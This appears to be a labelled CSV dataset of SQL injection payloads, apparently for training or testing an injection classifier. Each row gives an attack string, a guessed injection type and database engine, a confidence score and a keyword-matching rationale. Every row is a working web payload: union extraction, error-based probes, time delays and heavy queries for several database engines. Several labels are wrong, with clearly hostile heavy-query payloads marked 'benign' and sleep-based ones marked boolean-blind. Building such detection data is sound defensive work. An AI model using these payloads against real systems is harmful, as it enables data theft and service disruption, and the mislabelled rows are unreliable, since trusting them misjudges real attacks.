id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19631,"-4031"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""auhn"" = ""auhn",boolean_blind,generic,0.95,"Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-4031"" ) ) ) or 1570 = convert ( int, ( select cha'",3
19632,"1 where 6100 = 6100 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 where 6100 = 6100 and 2716 = ( select count ( * ',3
19633,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),boolean_blind,mysql,0.95,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1' rlike ( select * from ( select ( sleep ( 5 ) ) '",3
19634,1'|| ( select 'jmhb' where 1794 = 1794 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,"Token match: 'pg_sleep','pg_sleep' -> time_blind (priority P5); db_engine=postgresql from evidence ['pg_sleep']; payload snippet: '1'|| ( select 'jmhb' where 1794 = 1794 or 4240 = ('",2
19635,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""mkal"" like ""mkal",benign,generic,0.65,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: 'select count ( * ) from domain.domains as t1,domain.columns '; db_evidence=none; classified benign/generic",1
19636,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""nxvp"" = ""nxvp",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: 'select like ( 'abcdefg',upper ( hex ( randomblob ('",2
19637,"1 where 7240 = 7240 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: '1 where 7240 = 7240 or 6979 = like ( 'abcdefg',upp'",2
19638,1 where 8102 = 8102 and 9198 = 9198--,boolean_blind,generic,0.95,Token match: 'and 9198 = 9198' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 where 8102 = 8102 and 9198 = 9198--',3
19639,"1"" ) ) ) and ( 7758 = 4628 ) *4628 and ( ( ( ""wzas"" = ""wzas",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1"" ) ) ) and ( 7758 = 4628 ) *4628 and ( ( ( ""wzas"" = ""wzas'; db_evidence=none; classified benign/generic",2
19640,"1' ) where 1646 = 1646 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) where 1646 = 1646 or 9643 = ( select count ( ',3
19641,"1'|| ( select 'pzoe' where 2977 = 2977 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,generic,0.95,Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1'|| ( select 'pzoe' where 2977 = 2977 and elt ( 3',3
19642,"1%"" ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%"" ) ) ) or 5356 = ( select count ( * ) from sysu'",3
19643,"1' ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) and 2716 = ( select count ( * ) from sysusers',3
19644,"1 ) ) as hqwy where 4433 = 4433 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,generic,0.8,Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) ) as hqwy where 4433 = 4433 or exp ( ~ ( selec',2
19645,"1"" ) where 1699 = 1699 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) where 1699 = 1699 or 4915 = ( select count ( '",3
19646,1 ) as dlkh where 6179 = 6179 and 9198 = 9198--,boolean_blind,generic,0.95,Token match: 'and 9198 = 9198' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) as dlkh where 6179 = 6179 and 9198 = 9198--',3
19647,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,"Token match: 'dbms_pipe.receive_message','dbms_pipe' -> time_blind (priority P5); db_engine=oracle from evidence ['dbms_pipe']; payload snippet: '1 ) ) and 8312 = dbms_pipe.receive_message ( chr ('",3
19648,"1%' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",benign,generic,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1%' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ('; db_evidence=none; classified benign/generic,1
19649,"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",boolean_blind,mysql,0.65,"Token match: 'weak signal','benchmark' -> boolean_blind (priority P3); db_engine=mysql from evidence ['benchmark']; payload snippet: '1' where 7464 = 7464 and 2388 = benchmark ( 500000'",1
19650,"1 ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) ) and 9660 = ( select count ( * ) from all_use',3
19651,-6488' or 5164 = 9234,boolean_blind,generic,0.95,Token match: 'or 5164 = 9234' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-6488' or 5164 = 9234',3
19652,"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""deeu"" like ""deeu",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" or exp ( ~ ( select * from ( select concat ( 0x'",2
19653,"1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",boolean_blind,generic,0.95,Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9',3
19654,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""khuw"" like ""khuw",benign,generic,0.65,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: 'select count ( * ) from all_users t1,all_users t2,all_users '; db_evidence=none; classified benign/generic",1
19655,"1 ) as yduh where 6481 = 6481 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,"Token match: 'weak signal','rdb$fields','rdb$types' -> boolean_blind (priority P3); db_engine=firebird from evidence ['rdb$fields', 'rdb$types', 'rdb$collations', 'rdb$functions', 'rdb$']; payload snippet: '1 ) as yduh where 6481 = 6481 and 6414 = ( select '",3
19656,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""ksip"" like ""ksip",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: 'select like ( 'abcdefg',upper ( hex ( randomblob ('",2
19657,"1"" ) as mszg where 6184 = 6184 rlike sleep ( 5 ) --",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1"" ) as mszg where 6184 = 6184 rlike sleep ( 5 ) -'",2
19658,"1%"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""%"" = """,boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%"" ) ) ) and 8514 = ( select count ( * ) from dom'",3
19659,"1'|| ( select 'ryyc' from dual where 5196 = 5196 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",benign,oracle,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1'|| ( select 'ryyc' from dual where 5196 = 5196 or char ( 1'; db_evidence=['dual']; classified benign/generic,1
19660,"-2284%"" ) ) or 9323 = 9323#",boolean_blind,generic,0.95,"Token match: 'or 9323 = 9323' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-2284%"" ) ) or 9323 = 9323#'",3
19661,"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-1791' union all select 9316,9316,9316,9316,9316,9'",3
19662,"1"" rlike sleep ( 5 )",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1"" rlike sleep ( 5 )'",2
19663,"1%"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: '1%"" or 8421 = ( select count ( * ) from generate_s'",3
19664,-4308' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'jmot' = 'jmot,boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-4308' ) or 2724 in ( ( char ( 113 ) +char ( 113 )',3
19665,1' ) as scnn where 9274 = 9274,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' ) as scnn where 9274 = 9274'; db_evidence=none; classified benign/generic,2
19666,"-9313%"" ) or 5971 = 4572#",boolean_blind,generic,0.95,"Token match: 'or 5971 = 4572' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-9313%"" ) or 5971 = 4572#'",3
19667,"1%' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','extractvalue' -> boolean_blind (priority P3); db_engine=mysql from evidence ['extractvalue']; payload snippet: '1%' or extractvalue ( 1297,concat ( 0x5c,0x7171706'",2
19668,1' waitfor delay '0:0:5' and 'jree' = 'jree,time_blind,mssql,0.95,"Token match: 'waitfor delay','waitfor delay','waitfor' -> time_blind (priority P5); db_engine=mssql from evidence ['waitfor delay', 'waitfor']; payload snippet: '1' waitfor delay '0:0:5' and 'jree' = 'jree'",3
19669,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'yaim' = 'yaim,boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: '1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( '",3
19670,1%' ) ) union all select null#,union_based,generic,0.95,Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1%' ) ) union all select null#',3
19671,-4498 ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 2902 = 2902,boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: '-4498 ) or 4747 = dbms_utility.sqlid_to_sqlhash ( '",3
19672,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pziy' = 'pziy,boolean_blind,firebird,0.95,"Token match: 'weak signal','rdb$' -> boolean_blind (priority P3); db_engine=firebird from evidence ['rdb$']; payload snippet: '1' and 6240 = ( 'qqpjq'|| ( select case 6240 when '",3
19673,1'|| ( select 'byxb' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||',boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1'|| ( select 'byxb' where 8351 = 8351 and 2853 = ',3
19674,"1"" ) ) as wnzf where 3352 = 3352 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.8,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) ) as wnzf where 3352 = 3352 or char ( 117 ) |'",2
19675,1'+ ( select 'iqxn' where 1146 = 1146 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +',boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1'+ ( select 'iqxn' where 1146 = 1146 and 3715 in ',3
19676,"1' ) ) as kpdl where 4443 = 4443 union all select null,null,null,null,null,null--",union_based,generic,0.95,Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1' ) ) as kpdl where 4443 = 4443 union all select ',3
19677,"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'jvll' like 'jvll",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) and row ( 6237,7469 ) > ( select count ( * ) '",2
19678,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""urqg"" = ""urqg",benign,generic,0.65,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||cha'; db_evidence=none; classified benign/generic",1
19679,-7779' ) where 4976 = 4976 or 6872 = 6872--,boolean_blind,generic,0.95,Token match: 'or 6872 = 6872' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-7779' ) where 4976 = 4976 or 6872 = 6872--',3
19680,"select pg_sleep ( 5 ) and ""zhsc"" = ""zhsc",time_blind,postgresql,0.9,"Token match: 'pg_sleep','pg_sleep' -> time_blind (priority P5); db_engine=postgresql from evidence ['pg_sleep']; payload snippet: 'select pg_sleep ( 5 ) and ""zhsc"" = ""zhsc'",2
19681,select ( case when ( 7645 = 5921 ) then 7645 else 7645* ( select 7645 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.95,"Token match: 'case when','information_schema' -> boolean_blind (priority P3); db_engine=mysql from evidence ['information_schema']; payload snippet: 'select ( case when ( 7645 = 5921 ) then 7645 else '",3
19682,1' ) as pxcd where 9754 = 9754 or sleep ( 5 ) --,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1' ) as pxcd where 9754 = 9754 or sleep ( 5 ) --',2
19683,"1 ) ) as prnp where 4932 = 4932 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.8,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) ) as prnp where 4932 = 4932 or char ( 68 ) ||c',2
19684,"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ocfi' = 'ocfi",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','updatexml' -> boolean_blind (priority P3); db_engine=mysql from evidence ['updatexml']; payload snippet: '1' ) ) and updatexml ( 3393,concat ( 0x2e,0x717170'",2
19685,"1"" ) ) as tjdz where 8656 = 8656 union all select null,null,null,null,null--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1"" ) ) as tjdz where 8656 = 8656 union all select '",3
19686,-5020%' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = ',boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-5020%' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 1',3
19687,"-3633' ) where 3513 = 3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-3633' ) where 3513 = 3513 union all select 3513,3'",3
19688,"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""jref"" like ""jref",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( '",2
19689,1%' and sleep ( 5 ) #,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1%' and sleep ( 5 ) #',2
19690,-4538' ) ) ) or 3260 = 1236 and ( ( ( 'hpnd' like 'hpnd,boolean_blind,generic,0.95,Token match: 'or 3260 = 1236' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-4538' ) ) ) or 3260 = 1236 and ( ( ( 'hpnd' like ',3
19691,"-4136' ) ) as cczp where 7052 = 7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",union_based,generic,0.95,Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-4136' ) ) as cczp where 7052 = 7052 union all sel',3
19692,"1 ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",boolean_blind,mysql,0.65,"Token match: 'weak signal','benchmark' -> boolean_blind (priority P3); db_engine=mysql from evidence ['benchmark']; payload snippet: '1 ) and 2388 = benchmark ( 5000000,md5 ( 0x6d45715'",1
19693,"-6407' ) or elt ( 1631 = 4946,4946 ) and ( 'jpnz' = 'jpnz",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-6407' ) or elt ( 1631 = 4946,4946 ) and ( 'jpnz' '",2
19694,"1"" ) ) as ccjk where 1932 = 1932 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,"Token match: 'weak signal','sysibm' -> boolean_blind (priority P3); db_engine=db2 from evidence ['sysibm']; payload snippet: '1"" ) ) as ccjk where 1932 = 1932 or 8315 = ( selec'",3
19695,1' where 4115 = 4115,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' where 4115 = 4115'; db_evidence=none; classified benign/generic,2
19696,"1"" ) as gjlv where 1983 = 1983 and sleep ( 5 ) #",time_blind,generic,0.8,"Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1"" ) as gjlv where 1983 = 1983 and sleep ( 5 ) #'",2
19697,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual-- vykx",time_blind,oracle,0.95,"Token match: 'dbms_pipe.receive_message','dbms_pipe','dual' -> time_blind (priority P5); db_engine=oracle from evidence ['dbms_pipe', 'dual']; payload snippet: 'select dbms_pipe.receive_message ( chr ( 66 ) ||ch'",3
19698,"-3860' union all select 3510,3510,3510#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-3860' union all select 3510,3510,3510#'",3
19699,1' in boolean mode ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,"Token match: 'pg_sleep','pg_sleep' -> time_blind (priority P5); db_engine=postgresql from evidence ['pg_sleep']; payload snippet: '1' in boolean mode ) and 8594 = ( select 8594 from'",2
19700,"-4527' union all select 7115,7115#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-4527' union all select 7115,7115#'",3
19701,"-3672"" ) ) union all select 6093#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-3672"" ) ) union all select 6093#'",3
19702,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'zeum' = 'zeum",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','information_schema' -> boolean_blind (priority P3); db_engine=mysql from evidence ['information_schema']; payload snippet: '1' ) ) ) or ( select 9173 from ( select count ( * '",2
19703,"select count ( * ) from generate_series ( 1,5000000 ) and ( ""jzmg"" = ""jzmg",heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: 'select count ( * ) from generate_series ( 1,500000'",3
19704,"select count ( * ) from generate_series ( 1,5000000 )",heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: 'select count ( * ) from generate_series ( 1,500000'",3
19705,"1' ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1' ) ) union all select null,null,null,null,null,n'",3
19706,1%' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.95,"Token match: 'waitfor delay','waitfor delay','waitfor' -> time_blind (priority P5); db_engine=mssql from evidence ['waitfor delay', 'waitfor']; payload snippet: '1%' ) ) ) waitfor delay '0:0:5'--'",3
19707,1' where 4473 = 4473 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1' where 4473 = 4473 and ( select * from ( select ',2
19708,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 4959 = 4959",time_blind,oracle,0.95,"Token match: 'dbms_pipe.receive_message','dbms_pipe' -> time_blind (priority P5); db_engine=oracle from evidence ['dbms_pipe']; payload snippet: '1 ) and 6537 = dbms_pipe.receive_message ( chr ( 7'",3
19709,"1"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""azpb"" = ""azpb",boolean_blind,firebird,0.95,"Token match: 'weak signal','rdb$fields','rdb$types' -> boolean_blind (priority P3); db_engine=firebird from evidence ['rdb$fields', 'rdb$types', 'rdb$collations', 'rdb$functions', 'rdb$']; payload snippet: '1"" ) or 7552 = ( select count ( * ) from rdb$field'",3
19710,"1%' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and '%' = '",boolean_blind,mysql,0.65,"Token match: 'weak signal','benchmark' -> boolean_blind (priority P3); db_engine=mysql from evidence ['benchmark']; payload snippet: '1%' and 3824 = benchmark ( 5000000,md5 ( 0x7655564'",1
19711,1%' ) ) ) or sleep ( 5 ) and ( ( ( '%' = ',time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1%' ) ) ) or sleep ( 5 ) and ( ( ( '%' = '',2
19712,1'|| ( select 'xtcb' where 5240 = 5240,benign,generic,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1'|| ( select 'xtcb' where 5240 = 5240'; db_evidence=none; classified benign/generic,1
19713,"1' ) ) as popm where 6594 = 6594 union all select null,null#",union_based,generic,0.95,Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1' ) ) as popm where 6594 = 6594 union all select ',3
